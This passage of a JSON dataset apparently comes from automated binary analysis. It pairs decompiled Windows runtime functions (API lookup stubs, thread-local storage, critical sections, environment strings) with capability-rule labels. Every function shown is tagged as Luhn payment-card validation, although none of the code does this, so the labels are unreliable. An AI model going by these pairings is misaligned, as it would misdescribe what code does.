        "decompiled_code": "\nvoid fcn.0045fedb(void)\n\n{\n    fcn.00460090(0x11, \"LCMapStringEx\", 0x47f484, \"LCMapStringEx\");\n    return;\n}\n",
        "token_count": 47
    },
    "0045fef5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fef5(void)\n\n{\n    fcn.00460090(0x13, \"LocaleNameToLCID\", 0x47f4b8, \"LocaleNameToLCID\");\n    return;\n}\n",
        "token_count": 51
    },
    "0045ff0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045ff0f(void)\n\n{\n    fcn.00460090(0x14, \"LocateXStateFeature\", 0x47f4d4, \"LocateXStateFeature\");\n    return;\n}\n",
        "token_count": 52
    },
    "0045ff29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045ff29(void)\n\n{\n    fcn.00460090(0x15, 0x47f4f8, 0x47f4f0, 0x47f4f8);\n    return;\n}\n",
        "token_count": 55
    },
    "0045ff43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045ff43(void)\n\n{\n    fcn.00460090(0x16, \"MessageBoxW\", 0x47f504, \"MessageBoxW\");\n    return;\n}\n",
        "token_count": 43
    },
    "004601f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004601f2(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.00460090(0x19, \"AppPolicyGetProcessTerminationMethod\", 0x47f540, \"AppPolicyGetProcessTerminationMethod\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x47b3f8)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 140
    },
    "00460232": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00460232(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.00460090(0x1b, \"AppPolicyGetShowDeveloperDiagnostic\", 0x47f598, \"AppPolicyGetShowDeveloperDiagnostic\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x47b3f8)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "00460272": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00460272(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.00460090(0x1a, \"AppPolicyGetThreadInitializationType\", 0x47f56c, \"AppPolicyGetThreadInitializationType\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x47b3f8)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 139
    },
    "004603c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate thread local storage"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004603c2(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0x1f, \"FlsAlloc\", 0x47f61c, 0x47f624);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    }\n    else {\n        (**0x47b3f8)(arg_8h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00460401": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460401(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0x20, \"FlsFree\", 0x47f624, 0x47f62c);\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0046043a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsFree)();\n    return;\n}\n",
        "token_count": 148
    },
    "00460440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460440(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0x21, \"FlsGetValue\", 0x47f62c, 0x47f634);\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00460479. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)();\n    return;\n}\n",
        "token_count": 147
    },
    "0046047f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046047f(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0x22, \"FlsSetValue\", 0x47f634, 0x47f63c);\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h, arg_ch);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004604bb. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)();\n    return;\n}\n",
        "token_count": 155
    },
    "0046058b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046058b(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(10, \"GetSystemTimePreciseAsFileTime\", 0x47f3bc, \"GetSystemTimePreciseAsFileTime\");\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004605c4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)();\n    return;\n}\n",
        "token_count": 158
    },
    "004605ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004605ca(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(5, \"GetTempPath2W\", 0x47f32c, \"GetTempPath2W\");\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h, arg_ch);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00460606. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)();\n    return;\n}\n",
        "token_count": 155
    },
    "0046068d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046068d(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0xe, \"GetXStateFeaturesMask\", 0x47f440, \"GetXStateFeaturesMask\");\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h, arg_ch);\n        (*pcVar1)();\n        return;\n    }\n    fcn.0045ad41();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 132
    },
    "004606cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004606cd(uint lpCriticalSection, uint dwSpinCount, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0xf, 0x47e10c, 0x47f460, 0x47f468);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(lpCriticalSection, dwSpinCount);\n    }\n    else {\n        (**0x47b3f8)(lpCriticalSection, dwSpinCount, arg_10h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "004608b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004608b0(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.00460090(0x17, \"RoInitialize\", 0x47f518, \"RoInitialize\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        (**0x47b3f8)(arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 120
    },
    "00460919": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460919(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00460090(0x1e, \"SystemFunction036\", 0x47f600, \"SystemFunction036\");\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)(arg_8h, arg_ch);\n        (*pcVar1)();\n        return;\n    }\n    fcn.0045ad41();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 131
    },
    "00460959": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00460959(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.00460090(0x1d, \"SetThreadStackGuarantee\", 0x47f5e0, \"SetThreadStackGuarantee\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        (**0x47b3f8)(arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 130
    },
    "00460a08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00460a08(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = fcn.00460090(3, 0x47f304, 0x47f2fc, 0x47f304);\n    if (pcVar1 != NULL) {\n        (**0x47b3f8)();\n        iVar2 = (*pcVar1)();\n        if (iVar2 != 0) {\n            pcVar1 = fcn.00460090(7, \"GetLastActivePopup\", 0x47f368, \"GetLastActivePopup\");\n            if (pcVar1 == NULL) {\n                return iVar2;\n            }\n            (**0x47b3f8)(iVar2);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 191
    },
    "00460b9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460b9b(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x6cd920);\n    return;\n}\n",
        "token_count": 50
    },
    "00460be3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460be3(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x6cd920);\n    return;\n}\n",
        "token_count": 50
    },
    "00461008": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461008(int16_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == NULL) {\n        fcn.00461d2e();\n        *(arg_ch + 8) = 0;\n        *(arg_ch + 0xc) = 0;\n    }\n    else {\n        if (*arg_8h != 0) {\n            arg_8h_00 = fcn.00463192(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n            if (arg_8h_00 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0043bc5b(uVar2);\n                piVar3 = fcn.0043bcb5();\n                return *piVar3;\n            }\n            if ((*(arg_ch + 0xc) <= arg_8h_00 && arg_8h_00 != *(arg_ch + 0xc)) &&\n               (iVar1 = fcn.00461d62(arg_8h_00),  iVar1 != 0)) {\n                return iVar1;\n            }\n            iVar1 = fcn.00461c30(arg_14h, arg_8h, *(arg_ch + 8), *(arg_ch + 0xc));\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0043bc5b(uVar2);\n                piVar3 = fcn.0043bcb5();\n                return *piVar3;\n            }\n            *(arg_ch + 0x10) = iVar1 + -1;\n            return 0;\n        }\n        if ((*(arg_ch + 0xc) == 0) && (iVar1 = fcn.00461d62(1),  iVar1 != 0)) {\n            return iVar1;\n        }\n        **(arg_ch + 8) = 0;\n    }\n    *(arg_ch + 0x10) = 0;\n    return 0;\n}\n",
        "token_count": 517
    },
    "004610eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004610eb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.00461008(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 81
    },
    "004619d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004619d3(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.0043c04a(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 73
    },
    "004619f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004619f6(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.0043bf88(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "00461a19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461a19(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.0043c04a(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 73
    },
    "00461a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461a3c(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.0043c04a(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 74
    },
    "00461a5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461a5f(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.0043bf88(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 73
    },
    "00461a82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461a82(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.0043bf88(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "00461d62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461d62(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.00461d2e();\n    iVar1 = fcn.00461ddd(in_ECX + 8, arg_8h);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 158
    },
    "00461d9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461d9e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.00461d48();\n    iVar1 = fcn.00461ddd(in_ECX + 8, arg_8h * 2);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 163
    },
    "00461dfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461dfc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00461ec6();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.0045d185(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 129
    },
    "00461e31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461e31(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00461f4d();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.0045d185(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 130
    },
    "00461fd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00461fd7(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00461cef();\n    iVar2 = fcn.004610eb(arg_ch, arg_8h, uVar1);\n    if (iVar2 == 0) {\n        uVar1 = *(arg_8h + 8);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 118
    },
    "0046e150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e150(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0046e167(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "004620e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004620e3(int16_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    if (arg_8h == NULL) {\n        fcn.00462262();\n        iVar1 = 0;\n    }\n    else if (*arg_8h == 0) {\n        if ((*(arg_ch + 0xc) != 0) || (iVar1 = fcn.00462220(1),  iVar1 == 0)) {\n            **(arg_ch + 8) = 0;\n            iVar1 = 0;\n            *(arg_ch + 0x10) = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.00463192(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n        if (uVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.0043bc5b(uVar3);\n            piVar4 = fcn.0043bcb5();\n            iVar1 = *piVar4;\n        }\n        else if ((uVar2 < *(arg_ch + 0xc) || uVar2 == *(arg_ch + 0xc)) || (iVar1 = fcn.00462220(uVar2),  iVar1 == 0)) {\n            iVar1 = fcn.004621f1(arg_14h, arg_8h, *(arg_ch + 8), *(arg_ch + 0xc));\n            if (iVar1 == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0043bc5b(uVar3);\n                piVar4 = fcn.0043bcb5();\n                iVar1 = *piVar4;\n            }\n            else {\n                *(arg_ch + 0x10) = iVar1 + -1;\n                iVar1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 487
    },
    "004621a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004621a5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004620e3(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 83
    },
    "0046253f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046253f(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0046255b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046255b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    fcn.00431db0(arg_8h + 0x18, 0, 0x101);\n    *(arg_8h + 4) = 0;\n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0x21c) = 0;\n    *(arg_8h + 0xc) = 0;\n    iVar1 = 0;\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 0x14) = 0;\n    do {\n        *(arg_8h + 0x18 + iVar1) = *(iVar1 + 0x6cb008);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x101);\n    do {\n        *(arg_8h + 0x119 + iVar2) = *(iVar2 + 0x6cb109);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x100);\n    return;\n}\n",
        "token_count": 275
    },
    "004629f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004629f6(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045ce63();\n    fcn.00462763(arg_8h, 0, uVar1, 0x6cda88);\n    return;\n}\n",
        "token_count": 69
    },
    "00463299": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00463299(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    iVar1 = arg_8h;\n    if (arg_8h != 0) {\n        iVar1 = fcn.00463255(arg_8h);\n        iVar2 = iVar1 - arg_8h >> 1;\n        arg_8h_00 = fcn.00463192(0, 0, arg_8h, iVar2, 0, 0, 0, 0);\n        if (arg_8h_00 == 0) {\n            (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = fcn.0045d1bf(arg_8h_00);\n            if (iVar1 == 0) {\n                fcn.0045d185(0);\n                (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n                iVar1 = 0;\n            }\n            else {\n                iVar2 = fcn.00463192(0, 0, arg_8h, iVar2, iVar1, arg_8h_00, 0, 0);\n                if (iVar2 == 0) {\n                    fcn.0045d185(iVar1);\n                    iVar1 = 0;\n                }\n                else {\n                    fcn.0045d185(0);\n                }\n                (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 406
    },
    "00463339": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00463339(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00463255(arg_8h);\n    arg_8h_00 = iVar1 - arg_8h & 0xfffffffe;\n    iVar1 = fcn.0045d1bf(arg_8h_00);\n    if (iVar1 != 0) {\n        fcn.004312b0(iVar1, arg_8h, arg_8h_00);\n    }\n    fcn.0045d185(0);\n    (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n    return iVar1;\n}\n",
        "token_count": 206
    },
    "00463b32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463b32(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0045acc6(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00463b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463b50(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0043be56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00463b6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463b6e(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0045acc6(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00463b8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463b8c(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0043be56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00463be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463be0(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0046e56f(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00463bfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463bfe(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0046e442(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00463c56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
